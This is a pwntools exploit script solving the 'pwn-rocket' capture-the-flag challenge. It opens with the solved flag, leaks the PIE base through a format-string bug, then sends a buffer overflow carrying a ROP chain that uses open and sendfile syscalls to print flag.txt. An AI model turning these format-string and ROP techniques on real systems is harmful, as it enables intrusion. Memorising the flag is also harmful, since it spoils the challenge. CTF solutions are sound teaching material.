# flag - shctf{1-sma11-St3p-f0r-mAn-1-Giant-l3ap-f0r-manK1nd}

from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
		
		
gdbscript = '''
init-peda
b main
c
'''.format(**locals())

exe = "./pwn-rocket"
elf = context.binary = ELF(exe, checksec=False)

context.log_level = "info"

io = start()


def leak():
    """
    Sends a format string exploit payload to the authenticator to leak PIE base
    Note - in some environments index to leak binary address for runtime PIE base calculation would be 7, while remotly index is 6
    :return: Calculated PIE base address
    """
    
    log.info("Trigerring format string vulnerability")
    
    pie_offset = 0x00000000000010e0 # LOCAL - 0x0000000000001606
    leak_payload = b"%6$p|" # LOCAL - %7$p

    io.sendlineafter("Please authenticate >>>", leak_payload)
    io.recvuntil("<<< Welcome: ")
    leak = io.recvline().rstrip()

    pie_base = int(leak.split(b"|")[0], 16) - pie_offset

    log.success(f"Leaked PIE base at {hex(pie_base)}")

    return pie_base


def exploit(pie_base):
    """
    Triggers a buffer overflow vulnerability to send a poisoned buffer that contains a ROP chain
    The ROP chain utilizes the open syscall to open a file descriptor to flag.txt 
    and then utilizes sendfile syscall to copy data from returned FD by open(FD to flag.txt) to stdout
    Getting the flag can also be done using open,read and write syscalls
    :param pie_base: PIE base retrieved from leak() function is necessary to calculate binary addresses for ROP gadgets
    """
    offset = b'A'*72

    pop_rax = p64(pie_base + 0x0000000000001210) # pop rax, ret
    pop_rdi = p64(pie_base + 0x000000000000168b) # pop rdi, ret
    pop_rsi_r15 = p64(pie_base + 0x0000000000001689) # pop rsi, pop r15, ret
    pop_rdx = p64(pie_base + 0x00000000000014be) # pop rdx, ret
    pop_r10 = p64(pie_base + 0x00000000000014c7) # pop r10, ret
    
    open_syscall = p64(0x2) # open syscall number
    sendfile_syscall = p64(0x28) # sendfile syscall number
    
    flag_str = p64(pie_base + 0x2db8) # pointer to 'flag.txt' string
    
    syscall = p64(pie_base + 0x00000000000014db) # syscall, ret
    junk = p64(0xdeadbeefcafebabe)

    # open syscall performed - 
    # FLAG_FD = open("flag.txt", O_READONLY);
    rop = offset
    rop += pop_rax + open_syscall # RAX = 0x2
    rop += pop_rdi + flag_str # RDI = *flag.txt
    rop += pop_rsi_r15 + p64(0x0) + junk # RSI = O_READONLY, R15 = 0xdeadbeefcafebabe
    rop += pop_rdx + p64(0x0) # RDX = 0
    rop += syscall # syscall, ret

    # sendfile syscall performed -
    # sendfile(FLAG_FD, STDOUT, 0, 100);
    rop += pop_rax + sendfile_syscall # RAX = 0x28
    rop += pop_rdi + p64(0x1) # RDI = 1, STDOUT FD
    rop += pop_rsi_r15 + p64(0x3) + junk # RSI = FLAG_FD, R15 = 0xdeadbeefcafebabe
    rop += pop_rdx + p64(0x0) # RDX = 0, Offset
    rop += pop_r10 + p64(0x64) # R10 = 100, Count
    rop += syscall # syscall, ret

	
    io.sendline(rop)
    io.interactive()

def main():
    pie_base = leak()
    exploit(pie_base)


if __name__ == '__main__':
    main()
